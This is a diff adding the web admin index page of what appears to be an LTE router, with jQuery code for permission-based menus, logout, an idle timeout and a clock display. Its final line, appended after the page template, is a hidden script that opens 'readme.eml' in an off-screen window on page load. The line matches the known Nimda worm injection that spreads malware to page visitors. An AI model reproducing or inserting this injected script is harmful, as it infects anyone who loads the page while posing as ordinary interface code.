@@ -1,0 +1,292 @@
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script type="text/javascript">
+    $(document).ready(function() {
+        Page.render('#container', '#index_template', DOC);
+		
+		var Pageauth = Page.AUTH;
+        var Infoauth = parseInt(Pageauth.substr(Pageauth.length-2),16).toString(2);
+        var Settingauth =  parseInt(Pageauth.substr(Pageauth.length-4,2),16).toString(2);
+        var Sysauth = parseInt(Pageauth.substr(Pageauth.length-6,2),16).toString(2);
+
+        var menus = [];
+        if(parseInt(Infoauth.charAt(0),10)){
+            var infoMenu = new MenuHead("info_menu", MENU.info.head);
+            if(parseInt(Infoauth.charAt(1),10)){
+                infoMenu.push(new MenuBody("SYS_INFO", (Page.isRuKuVersion ? MENU.info.home : "") + MENU.info.device));
+            }
+            if(parseInt(Infoauth.charAt(2),10)){
+                infoMenu.push(new MenuBody("DEVICE_INFO", MENU.info.version));
+            }
+            //	infoMenu.push(new MenuBody("CLIENT_LIST", MENU.info.client));
+            menus.push(infoMenu);
+        }
+		
+        if(parseInt(Settingauth.charAt(0),10)) {
+            var settingMenu = new MenuHead("setting_menu", MENU.setting.head);
+            if(parseInt(Settingauth.charAt(1),10)) {
+                settingMenu.push(new MenuBody("NETWORK_CONFIG", MENU.setting.dhcp));
+            }
+            if(parseInt(Settingauth.charAt(2),10)) {
+                settingMenu.push(new MenuBody("WIRELESS_CONFIG", MENU.settingWifi.wifi));
+            }
+            menus.push(settingMenu);
+        }
+		
+        if(parseInt(Sysauth.charAt(0),10)) {
+			var sysMenu = new MenuHead("manage_menu", MENU.sys.manage);
+			//sysMenu.push(new MenuBody("SYS_SET", MENU.sys.settings));
+			//sysMenu.push(new MenuBody("SYS_LOG", MENU.sys.sysLog));
+            if(parseInt(Sysauth.charAt(1),10)) {
+                sysMenu.push(new MenuBody("SYS_UPDATE", MENU.sys.firmwareUpdate));
+            }
+			if(parseInt(Sysauth.charAt(1),10)) {
+                sysMenu.push(new MenuBody("CONFIG_UPDATE", MENU.sys.configUpdate));
+            }
+			
+			if(parseInt(Sysauth.charAt(2),10)) {
+                sysMenu.push(new MenuBody("SYS_TIME", MENU.sys.timeSetting));
+            }
+			
+			sysMenu.push(new MenuBody("SYS_REBOOT", MENU.sys.reboot));
+			
+			menus.push(sysMenu);
+        }
+			
+		
+        $('#menu').html(MenuUtil.create(menus));
+
+        /* LANGUAGE BEGIN */
+        var $languageSelect = $('#languageSelect');
+        $languageSelect.html(Page.getLanguageList(Page.language)).change(function() {
+            Page.changeLanguage($languageSelect);
+        });
+        /* LANGUAGE END */
+
+        function setMenuItem(itemId) {
+            var $lis = $('#menu li');
+            $lis.removeClass('current');
+            $('#' + itemId).parent().addClass('current');
+        }
+
+        $('#menu').accordion({
+            header: 'h3',
+            autoheight: false,
+            duration: 150
+        });
+        $('#menu h3').hover(function() {
+            $(this).not('.selected').addClass('hover');
+        }, function() {
+            $(this).removeClass('hover');
+        });
+
+        Page.$iframe = $('#right');
+        Page.initPage();
+        $(window).resize(function(){
+            Page.initPage();
+        });
+
+        $('#logout').click(function() {
+			Page.postJSON({
+                json: {
+                    cmd: RequestCmd.LOGOUT,
+                    method: JSONMethod.POST
+                },
+                success: function(data) {
+                  sessionStorage['sessionId'] = '';
+				  sessionStorage['loginName'] = '';
+			      sessionStorage['auth'] = '';
+			      sessionStorage['level'] ='';
+                  location.href = Page.getUrl(Url.LOGIN);
+                }
+            });
+
+			
+        });
+
+        var apnGuideClick = false;
+        $('#menu h3').bind('click', function(e){
+            //if (!apnGuideClick && Page.apnGuide) {
+              //  apnGuideClick = true;
+               // $('#BASIC_CONFIG').click();
+           // } else {
+            //    $(this).next().find("a").eq(0).click();
+           // }
+		   
+		    $(this).next().find("a").eq(0).click();
+        });
+
+        $('#menu li a').bind('click', function(e) {
+            var id = this.id;
+            var item = MenuItem[id];
+            if (item != null) {
+                if (item.cmd == RequestCmd.SYS_REBOOT) {
+                    SysUtil.rebootDevice(PROMPT.confirm.reboot);
+                } else {
+                    setMenuItem(id);
+                    Page.menuItem = item;
+                    Page.$iframe.load(item.url);
+                    
+                }
+            }
+        });
+
+        $('#smsInfo').click(function() {
+            var htmlVal = $(this).html();
+            if( htmlVal.indexOf("newsms") > -1) {
+                $('#SMS_RECEIVE').click();
+            } else {
+                return false;
+            }
+
+        });
+
+        $('#onlineHelp').click(function() {
+            $('#SYS_HELPER').click();
+        });
+
+        $('#btnClose').click(function() {
+            $('#info_box').hide();
+            $('#mask').hide();
+            $('#progress_box').hide();
+        });
+		
+		function listenOperation () {
+            var maxTime = 20; // seconds
+            var time = maxTime;
+            $('body').on('keydown mousemove mousedown', function(e){
+                time = maxTime; // reset
+            });
+            var intervalId = setInterval(function(){
+                time--;
+                if(time <= 0) {
+                    clearInterval(intervalId);
+                    $('#logout').click();
+                }
+            }, 1000*60);
+
+        }
+
+		function showSysTime() {
+            Page.postJSON({
+                json: {
+                    cmd: RequestCmd.GET_SYSTEM_TIME
+                },
+                success: function(data) {
+				  // var timeTo = new Date(parseInt(data.systime)*1000).toLocaleString();
+				 //  var time = timetrans(data.systime);
+                 //   $('#sysTime').text(time);
+				 // var timestamp = new Date(data.systime1).getTime();
+				// var timestamp = (new Date()).getTime();
+				// console.log(timestamp);
+				// console.log(data.systime);
+				
+				  var systime = data.systime;
+                    var intervalId2 = setInterval(function () {
+                        var time = timetrans(systime);
+                        $('#sysTime').text(time);
+                        systime ++;
+                    },1000)
+                }
+            });
+        }
+		
+		function timetrans(date){
+            var date = new Date(date*1000);//如果date为13位不需要乘1000
+            var Y = date.getFullYear() + '-';
+            var M = (date.getMonth()+1 < 10 ? '0'+(date.getMonth()+1) : date.getMonth()+1) + '-';
+            var D = (date.getDate() < 10 ? '0' + (date.getDate()) : date.getDate()) + ' ';
+            var h = (date.getHours() < 10 ? '0' + date.getHours() : date.getHours()) + ':';
+            var m = (date.getMinutes() <10 ? '0' + date.getMinutes() : date.getMinutes()) + ':';
+            var s = (date.getSeconds() <10 ? '0' + date.getSeconds() : date.getSeconds()) + ' ';
+			var a = new Array(DOC.week.item, DOC.week.item1, DOC.week.item2, DOC.week.item3, DOC.week.item4, DOC.week.item5, DOC.week.item6);
+            var w = a[date.getDay()];
+            return Y+M+D+h+m+s+w;
+        }
+		
+
+
+        // 获取是否为入库版本
+        StatusUtil.getSysStatus();
+        $('#menu h3').eq(0).next().find("a").eq(0).click();
+        $('#container').show();
+		showSysTime();
+		listenOperation ();
+		
+    });
+	
+	function noImage(img){ 
+				img.style.display="none"; 
+	}
+</script>
+<script type="text/template" id="index_template">
+    <div id="header">
+	<div id="logoDiv"><img src=".././images/customer.gif" onerror="noImage(this)" ></div>
+        <div id="closeInternet"></div>
+        <div id="userinfo">
+            <!-- LANGUAGE -->
+            <select id="languageSelect" name="languageSelect"></select>
+            <a id="logout" href="javascript:;"><%- link.logout %></a>&nbsp;
+            <!-- HELP -->
+            <a id="onlineHelp" href="javascript:;" style="display:none;"><%- link.help %></a>
+        </div>
+        <div id="timeinfo">
+		 <label id="sysTime"></label>
+		 </div>
+        <div id="header_right"></div>
+        <div id="siginfo">
+            <table cellpadding="0" cellspacing="4">
+                <tr>
+					<td id="netInfo"></td>
+                    <td id="wifiInfo"></td>
+                    <td id="lteUsbInfo"></td>
+                    <td id="lan1" style="display:none;"></td>
+                    <td id="lan2" style="display:none;"></td>
+                    <td id="lan3" style="display:none;"></td>
+                    <td id="lan4" style="display:none;"></td>
+                    <td id="wan1" style="display:none;"></td>
+                    <!-- SMS_INFO -->
+                    <td id="smsInfo"></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <div id="main">
+        <div id="left">
+            <div id="left_t"></div>
+            <div id="left_m">
+                <div id="menu"></div>
+            </div>
+            <div id="left_b"></div>
+        </div>
+
+        <div id="right"></div>
+    </div>
+
+    <div id="footer">
+        <span id="spanFooter"><%- copyright %></span>
+    </div>
+
+    <div id="mask"></div>
+
+    <div id="info_box">
+        <div id="info_head"></div>
+        <div id="info_close"><input id="btnClose" type="button" value="<%- btn.close %>" /></div>
+        <div id="info_tab_head"></div>
+        <div id="info_body">
+            <div id="info_main"></div>
+        </div>
+    </div>
+
+
+    <div id="progress_box">
+        <div id="progress_info"></div>
+        <div id="progress_bar">
+            <div id="progress_status"></div>
+        </div>
+    </div>
+    <div id="edit_box"></div>
+</script>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
